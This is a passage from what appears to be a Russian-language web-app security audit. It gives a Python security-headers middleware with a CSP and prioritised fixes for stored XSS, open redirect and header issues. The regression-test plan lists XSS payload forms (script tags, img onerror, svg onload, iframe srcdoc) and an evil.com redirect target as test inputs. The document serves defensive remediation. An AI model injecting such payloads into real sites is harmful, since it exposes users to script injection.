- **Нет HSTS** → возможен HTTP-downgrade (если прокси внезапно отдаст http).
- **Нет X-Content-Type-Options на HTML/JSON** → MIME-sniffing атаки (хотя chat/files уже nosniff).
- **Нет Referrer-Policy** → утечка URL'ов в external requests (Referer header).

**Effort:** S / 2-4 часа.
**Fix direction:** новый middleware `SecurityHeadersMiddleware`:
```python
class SecurityHeadersMiddleware:
    async def __call__(self, scope, receive, send):
        if scope["type"] != "http":
            await self.app(scope, receive, send); return
        async def send_wrapper(msg):
            if msg["type"] == "http.response.start":
                headers = list(msg.get("headers", []))
                headers.extend([
                    (b"x-content-type-options", b"nosniff"),
                    (b"x-frame-options", b"SAMEORIGIN"),
                    (b"referrer-policy", b"same-origin"),
                    (b"content-security-policy",
                     b"default-src 'self'; "
                     b"script-src 'self' 'unsafe-inline'; "  # после фикса C1 убрать unsafe-inline
                     b"style-src 'self' 'unsafe-inline'; "
                     b"img-src 'self' data: blob:; "
                     b"connect-src 'self'; "
                     b"frame-ancestors 'self'; "
                     b"base-uri 'self';"),
                ])
                msg["headers"] = headers
            await send(msg)
        await self.app(scope, receive, send_wrapper)
```
Регистрировать в `app/main.py:create_app()` сразу после `HTTPSRedirectMiddleware`.

---

## §L. Рекомендации по приоритету

### Срочно (CRITICAL/HIGH) — порядок исполнения

1. **C2 + H1 + H3 (1 sprint, ~1 день суммарно)** — заменить `innerHTML` на `textContent` (C2) и `DOMPurify.sanitize` (H1, H3). Это блокирует stored XSS distribution прямо сейчас.
2. **C1 (server-side bleach санитизация — 1 sprint, ~1 день)** — добавить `bleach.clean` в `ActContentService.save_content`. Whitelist: `[p, br, b, strong, i, em, u, span, a, ul, ol, li, h1-h6, div]` + атрибуты `[href, class, style*]`, **без `on*`/`src`/`srcdoc`/`formaction`**. После этого C1/H1/H3 закрыты на корне.
3. **H2 (security headers, 1 sprint, ~0.5 дня)** — `SecurityHeadersMiddleware`. CSP в режиме `Content-Security-Policy-Report-Only` сначала, чтобы найти inline-script'ы, затем switch на enforce.
4. **Регрессионный тест:** добавить pytest, проверяющий что `PUT /acts/{id}/content` с payload `<img onerror=...>` сохраняет sanitized content (без `onerror`).

### Средний приоритет (MEDIUM) — следующий sprint

5. **M2** — escape `data-username` в `admin-add-user-dialog.js:119` (15 мин).
6. **M1** — escape `entry.username`/`v.username` в `dialog-audit-log.js` (15 мин).
7. **M3 (open-redirect)** — whitelist external hosts в `isAllowedUrl` (синхронно на фронте и бэке).
8. **M4** — документировать в `docs/security.md`, что localStorage содержит полное содержимое акта; добавить опцию очистки при logout.

### Low / cleanup

9. **L1** — убрать `getAuthHeaders()` и связанные `X-JupyterHub-User`-инъекции (если бэк не использует — мёртвый код).
10. **L2** — убрать header-fallback в `app/routes/portal.py:39-41`, всегда ENV.
11. **L3 / I1** — после фикса XSS становится самопроизвольно митигированным; держать username в memory вместо localStorage (опционально).

### Контрольные регрессионные тесты

- `tests/security/test_xss_act_content.py`: POST payload с `<script>`, `<img onerror>`, `<svg onload>`, `<iframe srcdoc>`, проверка что сохранённый content не содержит `on*`-атрибуты и опасные теги.
- `tests/security/test_security_headers.py`: GET `/`, `/constructor?act_id=1`, `/api/v1/auth/me` — проверка наличия CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.
- `tests/security/test_open_url_whitelist.py`: ClientActionBlock с `https://evil.com` отклоняется на бэке.
- Регрессия в `tests/test_gp_compatibility.py` — добавить проверку, что миграции `acts` не вводят `updated_at`-триггер (уже есть) + что нет конкретных HTML-полей с `text` без серверной валидации.
